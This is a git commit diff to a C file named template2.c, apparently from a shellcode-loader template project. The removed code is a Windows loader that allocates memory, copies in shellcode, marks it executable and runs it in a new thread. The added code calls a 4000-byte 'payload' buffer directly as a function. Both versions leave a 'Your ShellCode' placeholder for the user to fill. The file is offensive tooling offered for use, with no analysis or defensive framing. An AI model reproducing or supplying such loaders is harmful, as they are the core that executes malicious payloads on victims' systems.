122e9de3de3eaf3a2cede6086a1a79b6dc1fb5d8
arash138814 <arashranjbar599@gmail.com>
2025-05-05 21:34:39 +0330

    Update template2.c

--- template2.c
+++ template2.c
@@ -1,26 +1,12 @@
-#include <windows.h>
 #include <stdio.h>
-unsigned char shellcode[] = ""; // Your ShellCode
-int main()
+
+#define SCSIZE 4000
+char payload[SCSIZE] = ""; // Your ShellCode
+
+char comment[712] = "";
+
+int main(int argc, char **argv)
 {
-    LPVOID exec_mem;
-    HANDLE thread;
-    DWORD old_protect = 0;
-    exec_mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (exec_mem == NULL)
-    {
-        return -1;
-    }
-    memcpy(exec_mem, shellcode, sizeof(shellcode));
-    if (!VirtualProtect(exec_mem, sizeof(shellcode), PAGE_EXECUTE_READ, &old_protect))
-    {
-        return -1;
-    }
-    thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
-    if (thread == NULL)
-    {
-        return -1;
-    }
-    WaitForSingleObject(thread, INFINITE);
-    return 0;
+    (*(void (*)())payload)();
+    return (0);
 }
